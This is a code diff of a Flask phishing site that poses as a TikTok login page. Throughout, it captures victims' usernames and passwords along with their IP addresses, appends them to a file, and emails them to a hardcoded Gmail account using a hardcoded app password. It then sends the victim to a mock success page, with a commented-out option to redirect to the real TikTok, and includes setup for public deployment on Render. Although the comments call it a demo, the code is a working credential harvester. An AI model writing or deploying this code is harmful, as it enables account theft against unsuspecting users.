@@ -3,8 +3,7 @@
 from flask import Flask, render_template, request, redirect, url_for
 import smtplib
 from email.mime.text import MIMEText
-import os
-from datetime import datetime # Import datetime for timestamp
+import os # For accessing environment variables
 
 app = Flask(__name__)
 
@@ -21,7 +20,7 @@ EMAIL_ADDRESS = "mwananchihuslerloans@gmail.com"
 # Use a Gmail App Password here.
 # Generate one from your Google Account security settings.
 # For this demo, you will put your actual App Password here:
-EMAIL_PASSWORD = "mokasgadsacljec" # <--- VERIFY THIS EXACTLY (NO SPACES)
+EMAIL_PASSWORD = "mokasgadsaacljec" # <--- REPLACE THIS WITH YOUR APP PASSWORD
 TO_EMAIL = "mwananchihuslerloans@gmail.com" # This is the recipient email
 
 @app.route("/")
@@ -39,11 +38,9 @@ def login():
     # In a real scenario, this would be logged securely (e.g., to a database)
     # and not to a flat file that might not persist on cloud platforms.
     try:
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        ip_address = request.environ.get('REMOTE_ADDR', 'Unknown IP') # Get client IP
         with open("credentials.txt", "a") as f:
-            f.write(f"[{timestamp}] IP: {ip_address} - User: {username} | Pass: {password}\n")
-        print(f"Credentials saved to credentials.txt: {username} | {password}")
+            f.write(f"Timestamp: {request.environ.get('REMOTE_ADDR')} - User: {username} | Pass: {password}\n")
+        print("Credentials saved to credentials.txt")
     except Exception as e:
         print(f"Error saving credentials to file: {e}")
     # --- End Credential Logging ---
@@ -55,7 +52,7 @@ def login():
             smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
 
             subject = "Phishing Capture Alert"
-            body = f"New Phishing Attempt:\n\nUsername: {username}\nPassword: {password}\nIP Address: {request.environ.get('REMOTE_ADDR', 'Unknown IP')}\nTimestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            body = f"New Phishing Attempt:\n\nUsername: {username}\nPassword: {password}\nIP Address: {request.environ.get('REMOTE_ADDR')}"
 
             msg = MIMEText(body)
             msg['Subject'] = subject
@@ -67,13 +64,30 @@ def login():
 
     except Exception as e:
         print(f"Error sending email: {e}")
-        # This print statement is crucial for debugging on Render logs!
-        # It should show you why the email failed.
+        # In a real app, you might want to log the error to a system log
+        # or a monitoring service, but avoid exposing internal errors to users.
 
-    # Redirect the user directly to the real TikTok website after capturing credentials.
-    return redirect("https://www.tiktok.com", code=302)
+    # Redirect the user to a seemingly legitimate page after "login"
+    # For a phishing demo, this would typically be the real TikTok site
+    # or a convincing "success" page.
+    # For a demo, you can redirect to google.com or a mock success page.
+    return redirect(url_for('mock_tiktok_redirect')) # Redirect to a mock success page or real TikTok
+
+# A mock page to redirect to, simulating a "successful" login
+@app.route("/redirect_after_login")
+def mock_tiktok_redirect():
+    # You could redirect to the real TikTok here for a more convincing demo
+    # return redirect("https://www.tiktok.com", code=302)
+    return "Login successful! Redirecting to TikTok... (This is a mock page for the demo)"
 
 # --- IMPORTANT FOR RENDER DEPLOYMENT ---
+# Your Flask app MUST bind to 0.0.0.0 and use the dynamic PORT provided by Render
+# for it to be accessible from the internet.
 if __name__ == '__main__':
+    # Get the port from the environment variable 'PORT' set by Render.
+    # Default to 5000 for local development if 'PORT' is not set.
     port = int(os.environ.get('PORT', 5000))
+    
+    # Run the Flask app, binding to 0.0.0.0 and the dynamic port.
+    # debug=True is good for development but should be False in production.
     app.run(host='0.0.0.0', port=port, debug=True)
